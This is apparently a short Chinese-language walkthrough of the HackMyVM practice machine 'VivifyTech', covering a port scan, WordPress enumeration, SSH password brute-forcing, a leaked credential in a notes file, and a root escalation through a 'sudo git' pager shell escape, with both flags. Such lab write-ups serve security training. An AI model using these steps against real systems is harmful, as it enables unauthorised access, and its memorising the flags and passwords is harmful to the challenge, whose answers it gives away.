# VivifyTech

2025.03.13 https://hackmyvm.eu/machines/machine.php?vm=VivifyTech

## Ip

192.168.5.39

## Scan

```
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
3306/tcp  open  mysql
33060/tcp open  mysqlx
```

web 扫描发现 http://192.168.5.39/wordpress/ , 先上 wpscan 发现用户名 sancelisso 爆破没戏。

再次扫描 wordpress，发现这个 url http://192.168.5.39/wordpress/wp-includes/secrets.txt 里面存有密码字典，再次使用这个字典爆破 wordpress 也没成功。

在下面这个帖子的标题上看到 The story behind VivifyTech 可能有提示， http://192.168.5.39/wordpress/index.php/2023/12/05/the-story-behind-vivifytech/ 中找到了几个这个公司的人员的姓名：

```
sarah
mark
emily
jake
alex
```

目前还有一个 ssh 途径，使用上面的到的 secret.txt 和存在的用户名，进行爆破：

```
[22][ssh] host: 192.168.5.39   login: sarah   password: bohicon
```

进行 ssh 登陆，先读取到 user flag：

```
sarah@VivifyTech:~$ cat user.txt
HMV{Y0u_G07_Th15_0ne_6543}
```

枚举后，发现提示文件：

```
sarah@VivifyTech:~$ cat /home/sarah/.private/Tasks.txt
- Change the Design and architecture of the website
- Plan for an audit, it seems like our website is vulnerable
- Remind the team we need to schedule a party before going to holidays
- Give this cred to the new intern for some tasks assigned to him - gbodja:4Tch055ouy370N
```

新的用户凭据 gbodja:4Tch055ouy370N 切换后 sudo 显示 (ALL) NOPASSWD: /usr/bin/git 提权到 root：

```
sudo git -p help config
!/bin/sh
```

拿到 root flag：

```
root@VivifyTech:~# cat root.txt
HMV{Y4NV!7Ch3N1N_Y0u_4r3_7h3_R007_8672}
```
